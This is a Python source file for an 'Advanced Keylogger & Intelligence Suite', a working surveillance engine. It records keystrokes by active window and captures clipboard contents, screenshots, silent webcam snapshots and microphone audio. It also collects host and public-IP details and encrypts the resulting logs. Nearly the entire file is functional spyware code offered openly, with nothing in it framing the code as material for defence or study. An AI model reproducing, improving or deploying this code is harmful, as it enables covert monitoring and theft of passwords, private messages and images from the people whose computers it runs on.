"""
===================================================================
Project: Advanced Keylogger & Intelligence Suite
Author: Avi
Date: 2026
Description: Multi-threaded engine for Active Window Keystroke Logging,
             Silent WebCamera Snaps, Screen Grabs, Audio Recording,
             Clipboard Capture, System Info, and Log Encryption.
===================================================================
"""

import os
import sys
import time
import json
import socket
import platform
import threading
from datetime import datetime

import requests
from pynput import keyboard

# Platform-specific imports for Windows
IS_WINDOWS = sys.platform.startswith("win")
if IS_WINDOWS:
    try:
        import win32gui
        import win32clipboard
    except ImportError:
        pass

# Optional media libraries with graceful fallback
try:
    import cv2
    HAS_OPENCV = True
except ImportError:
    HAS_OPENCV = False

try:
    from PIL import ImageGrab
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import sounddevice as sd
    from scipy.io.wavfile import write as wav_write
    HAS_AUDIO = True
except ImportError:
    HAS_AUDIO = False

try:
    from cryptography.fernet import Fernet
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False


class KeyLoggerEngine:
    def __init__(self, config_path="config.json"):
        self.config_path = config_path
        self.config = self.load_config()
        self.log_dir = self.config.get("log_dir", "logs")
        self.ensure_directories()

        self.is_running = False
        self.current_window = ""
        self.key_buffer = []
        self.total_keystrokes = 0
        self.last_clipboard = ""
        self.listener = None
        self.worker_thread = None

        # Lock for safe thread access to files/buffers
        self.lock = threading.Lock()

        # Paths
        self.keys_log_path = os.path.join(self.log_dir, self.config.get("keys_info", "key_log.txt"))
        self.system_info_path = os.path.join(self.log_dir, self.config.get("system_info", "systeminfo.txt"))
        self.clipboard_log_path = os.path.join(self.log_dir, self.config.get("clipboard_info", "clipboard.txt"))
        self.screenshots_dir = os.path.join(self.log_dir, "screenshots")
        self.webcam_dir = os.path.join(self.log_dir, "webcam")
        self.audio_dir = os.path.join(self.log_dir, "audio")

        os.makedirs(self.screenshots_dir, exist_ok=True)
        os.makedirs(self.webcam_dir, exist_ok=True)
        os.makedirs(self.audio_dir, exist_ok=True)

    def load_config(self):
        if os.path.exists(self.config_path):
            try:
                with open(self.config_path, "r", encoding="utf-8") as f:
                    return json.load(f)
            except Exception as e:
                print(f"[!] Error loading config.json: {e}")
        return {
            "author": "Avi",
            "log_dir": "logs",
            "keys_info": "key_log.txt",
            "system_info": "systeminfo.txt",
            "clipboard_info": "clipboard.txt",
            "microphone_time_seconds": 10,
            "capture_interval_seconds": 30
        }

    def ensure_directories(self):
        os.makedirs(self.log_dir, exist_ok=True)

    def get_active_window(self):
        """Get title of currently active foreground window."""
        if IS_WINDOWS:
            try:
                hwnd = win32gui.GetForegroundWindow()
                title = win32gui.GetWindowText(hwnd)
                return title.strip() if title else "Desktop / System"
            except Exception:
                return "Unknown Window"
        return platform.system() + " Window"

    def write_system_info(self):
        """Extract host and hardware diagnostics into systeminfo.txt."""
        try:
            hostname = socket.gethostname()
            try:
                local_ip = socket.gethostbyname(hostname)
            except Exception:
                local_ip = "127.0.0.1"

            try:
                pub_ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
            except Exception:
                pub_ip = "Offline / Unavailable"

            sys_details = [
                "==================================================",
                f"       ADVANCED KEYLOGGER SUITE - SYSTEM INFO     ",
                f"       Author: {self.config.get('author', 'Avi')}",
                f"       Captured At: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                "==================================================",
                f"Hostname        : {hostname}",
                f"Local IP        : {local_ip}",
                f"Public IP       : {pub_ip}",
                f"OS System       : {platform.system()} {platform.release()}",
                f"OS Version      : {platform.version()}",
                f"Architecture    : {platform.machine()}",
                f"Processor       : {platform.processor()}",
                f"Python Version  : {platform.python_version()}",
                "==================================================\n"
            ]

            with open(self.system_info_path, "w", encoding="utf-8") as f:
                f.write("\n".join(sys_details))
        except Exception as e:
            print(f"[!] System info extraction error: {e}")

    def on_key_press(self, key):
        """Callback for keyboard events."""
        if not self.is_running:
            return

        with self.lock:
            self.total_keystrokes += 1
            win_title = self.get_active_window()

            # Check if active window changed
            if win_title != self.current_window:
                self.current_window = win_title
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                header = f"\n\n[ Window: {self.current_window} | Time: {timestamp} ]\n"
                self.append_to_file(self.keys_log_path, header)

            # Format keystroke cleanly
            try:
                key_char = key.char
                if key_char is None:
                    key_str = f"[{str(key)}]"
                else:
                    key_str = key_char
            except AttributeError:
                if key == keyboard.Key.space:
                    key_str = " "
                elif key == keyboard.Key.enter:
                    key_str = "\n"
                elif key == keyboard.Key.tab:
                    key_str = "\t"
                elif key == keyboard.Key.backspace:
                    key_str = "[BACKSPACE]"
                else:
                    key_name = str(key).replace("Key.", "").upper()
                    key_str = f"[{key_name}]"

            self.append_to_file(self.keys_log_path, key_str)

    def append_to_file(self, filepath, content):
        """Thread-safe append helper."""
        try:
            with open(filepath, "a", encoding="utf-8") as f:
                f.write(content)
        except Exception as e:
            print(f"[!] File append error ({filepath}): {e}")

    def check_clipboard(self):
        """Silently grab clipboard data if modified."""
        if not IS_WINDOWS:
            return
        try:
            win32clipboard.OpenClipboard()
            if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
                data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
                win32clipboard.CloseClipboard()

                if data and data != self.last_clipboard:
                    self.last_clipboard = data
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    entry = f"[{timestamp}] Clipboard Copy:\n{data}\n----------------------------------------\n"
                    self.append_to_file(self.clipboard_log_path, entry)
            else:
                win32clipboard.CloseClipboard()
        except Exception:
            pass

    def trigger_screenshot(self):
        """Capture screen silently and save to screenshots folder."""
        if not HAS_PIL:
            return None
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}.png"
            filepath = os.path.join(self.screenshots_dir, filename)
            img = ImageGrab.grab()
            img.save(filepath, "PNG")

            # Also maintain latest default screenshot for quick display
            latest_path = os.path.join(self.log_dir, self.config.get("screenshot_info", "screenshot.png"))
            img.save(latest_path, "PNG")

            return filepath
        except Exception as e:
            print(f"[!] Screenshot error: {e}")
            return None

    def trigger_webcam(self):
        """Capture webcam snap silently (no window popup)."""
        if not HAS_OPENCV:
            return None
        try:
            cam = cv2.VideoCapture(0, cv2.CAP_DSHOW if IS_WINDOWS else cv2.CAP_ANY)
            if not cam.isOpened():
                return None

            ret, frame = cam.read()
            cam.release()

            if ret and frame is not None:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"webcam_{timestamp}.png"
                filepath = os.path.join(self.webcam_dir, filename)
                cv2.imwrite(filepath, frame)

                latest_path = os.path.join(self.log_dir, self.config.get("webcam_info", "webCamera.png"))
                cv2.imwrite(latest_path, frame)

                return filepath
        except Exception as e:
            print(f"[!] Webcam capture error: {e}")
        return None

    def trigger_audio(self):
        """Record audio clip from default microphone."""
        if not HAS_AUDIO:
            return None
        try:
            duration = self.config.get("microphone_time_seconds", 10)
            sample_rate = 44100
            recording = sd.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2)
            sd.wait()

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"audio_{timestamp}.wav"
            filepath = os.path.join(self.audio_dir, filename)
            wav_write(filepath, sample_rate, recording)

            latest_path = os.path.join(self.log_dir, self.config.get("audio_info", "audio.wav"))
            wav_write(latest_path, sample_rate, recording)

            return filepath
        except Exception as e:
            print(f"[!] Audio recording error: {e}")
            return None

    def encrypt_logs(self, key_bytes=None):
        """Encrypt plain text logs using Fernet AES encryption."""
        if not HAS_CRYPTO:
            return False
        try:
            key_file = self.config.get("encryption", {}).get("key_file", "encryption_key.txt")
            if not os.path.exists(key_file):
                key = Fernet.generate_key()
                with open(key_file, "wb") as kf:
                    kf.write(key)
            else:
                with open(key_file, "rb") as kf:
                    key = kf.read().strip()

            fernet = Fernet(key)
            files_to_encrypt = [self.keys_log_path, self.system_info_path, self.clipboard_log_path]

            for filepath in files_to_encrypt:
                if os.path.exists(filepath):
                    with open(filepath, "rb") as f:
                        plain_data = f.read()
                    if plain_data:
                        enc_data = fernet.encrypt(plain_data)
                        enc_path = os.path.join(self.log_dir, "enc_" + os.path.basename(filepath))
                        with open(enc_path, "wb") as f_out:
                            f_out.write(enc_data)
            return True
        except Exception as e:
            print(f"[!] Encryption error: {e}")
            return False

    def periodic_tasks(self):
        """Background routine running periodic snapshots & monitoring."""
        interval = self.config.get("capture_interval_seconds", 30)
        while self.is_running:
            try:
                self.check_clipboard()
                self.trigger_screenshot()
                self.trigger_webcam()
            except Exception as e:
                print(f"[!] Background task error: {e}")

            # Sleep in small increments so stop signal is responsive
            for _ in range(interval):
                if not self.is_running:
                    break
                time.sleep(1)

    def start(self):
        """Start keylogger engine & background monitoring."""
        if self.is_running:
            return

        self.is_running = True
        self.write_system_info()

        # Start keyboard listener
        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.start()

        # Start periodic worker thread
        self.worker_thread = threading.Thread(target=self.periodic_tasks, daemon=True)
        self.worker_thread.start()
        print(f"[*] KeyLogger Engine started successfully by Author: {self.config.get('author', 'Avi')}")

    def stop(self):
        """Stop keylogger engine gracefully."""
        self.is_running = False
        if self.listener:
            self.listener.stop()
        print("[*] KeyLogger Engine stopped.")

    def get_stats(self):
        """Return engine metrics for Web Dashboard."""
        screenshots_count = len(os.listdir(self.screenshots_dir)) if os.path.exists(self.screenshots_dir) else 0
        webcam_count = len(os.listdir(self.webcam_dir)) if os.path.exists(self.webcam_dir) else 0
        audio_count = len(os.listdir(self.audio_dir)) if os.path.exists(self.audio_dir) else 0

        return {
            "status": "Active" if self.is_running else "Paused",
            "author": self.config.get("author", "Avi"),
            "total_keystrokes": self.total_keystrokes,
            "active_window": self.current_window or self.get_active_window(),
            "screenshots_count": screenshots_count,
            "webcam_count": webcam_count,
            "audio_count": audio_count,
            "last_updated": datetime.now().strftime("%H:%M:%S")
        }
